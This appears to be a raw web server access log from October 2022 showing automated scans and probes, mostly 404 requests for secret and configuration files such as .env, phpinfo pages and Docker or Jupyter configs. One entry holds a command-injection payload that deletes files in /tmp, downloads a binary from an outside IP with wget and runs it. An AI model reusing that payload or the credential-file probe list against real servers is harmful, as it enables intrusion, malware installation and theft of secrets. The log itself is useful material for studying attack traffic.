94.102.61.10 - - [18/Oct/2022:00:04:06 +0000] "GET / HTTP/1.1" 200 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:04:43:52 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.223.79.105 - - [18/Oct/2022:05:33:39 +0000] "\x16\x03\x01" 400 509 "-" "-"
159.223.79.105 - - [18/Oct/2022:05:33:39 +0000] "\x16\x03\x01" 400 509 "-" "-"
159.223.79.105 - - [18/Oct/2022:05:33:39 +0000] "\x16\x03\x01" 400 509 "-" "-"
51.79.29.48 - - [18/Oct/2022:05:54:10 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:05:54:10 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.145 - - [18/Oct/2022:06:27:25 +0000] "GET / HTTP/1.0" 200 300 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
51.79.29.48 - - [18/Oct/2022:06:31:01 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:06:31:02 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.78.6.216 - - [18/Oct/2022:06:32:57 +0000] "GET / HTTP/1.1" 200 337 "-" "python-requests/2.28.1"
36.46.131.112 - - [18/Oct/2022:06:34:52 +0000] "GET / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
36.46.131.112 - - [18/Oct/2022:06:34:52 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
198.235.24.143 - - [18/Oct/2022:06:45:36 +0000] "GET / HTTP/1.1" 200 281 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.61.185.198 - - [18/Oct/2022:07:25:00 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.221.73 - - [18/Oct/2022:07:33:52 +0000] "GET /manager/text/list HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
51.79.29.48 - - [18/Oct/2022:07:35:20 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:07:35:20 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
31.220.1.83 - - [18/Oct/2022:07:48:18 +0000] "GET / HTTP/1.1" 200 281 "-" "Mozilla/5.0 zgrab/0.x"
147.124.217.246 - - [18/Oct/2022:07:50:36 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
147.124.217.246 - - [18/Oct/2022:07:50:37 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.213.219 - - [18/Oct/2022:08:01:44 +0000] "GET /manager/html HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
51.79.29.48 - - [18/Oct/2022:08:08:41 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:08:08:41 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.1.248.42 - - [18/Oct/2022:08:19:44 +0000] "GET / HTTP/1.1" 200 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:08:56:03 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:08:56:03 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:10:24:51 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:10:24:51 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
138.197.13.130 - - [18/Oct/2022:10:41:32 +0000] "?E" 400 509 "-" "-"
184.105.247.254 - - [18/Oct/2022:10:43:55 +0000] "GET / HTTP/1.1" 200 281 "-" "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0"
184.105.247.244 - - [18/Oct/2022:10:48:32 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
128.14.209.234 - - [18/Oct/2022:11:12:49 +0000] "GET / HTTP/1.1" 200 281 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:11:17:05 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:11:17:05 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.109.46.66 - - [18/Oct/2022:11:19:02 +0000] "GET / HTTP/1.1" 200 281 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
146.66.178.78 - - [18/Oct/2022:11:40:26 +0000] "CONNECT mkzaim.ru:443 HTTP/1.1" 405 500 "-" "Go-http-client/1.1"
181.49.102.102 - - [18/Oct/2022:11:45:37 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 488 "-" "Hello, world"
51.79.29.48 - - [18/Oct/2022:11:54:22 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:11:54:22 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.231 - - [18/Oct/2022:12:09:48 +0000] "GET / HTTP/1.1" 200 281 "-" "-"
176.58.124.134 - - [18/Oct/2022:12:10:38 +0000] "GET / HTTP/1.1" 400 509 "-" "-"
51.79.29.48 - - [18/Oct/2022:12:38:55 +0000] "POST / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [18/Oct/2022:12:38:55 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET / HTTP/1.1" 200 337 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /phpinfo.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /phpinfo HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /info.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /php.ini HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /php.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /infophp.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /test.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /php-info.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /linusadmin-phpinfo.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /infos.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /old_phpinfo.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /temp.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /time.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /phpversion.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /pinfo.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /i.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /asdf.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /config/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /info.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /.config/gatsby/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /.cordova/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /.deployment-config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /.docker/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:50 +0000] "GET /.docker/daemon.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /.jupyter/jupyter_notebook_config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /.lanproxy/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /_wpeprivate/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /console/base/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /console/payments/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /server/config.json HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /.env.bak HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /.env HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /config.env HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /.env.dist HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /.env.dev HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
3.71.27.38 - - [18/Oct/2022:12:44:51 +0000] "GET /.env.local HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
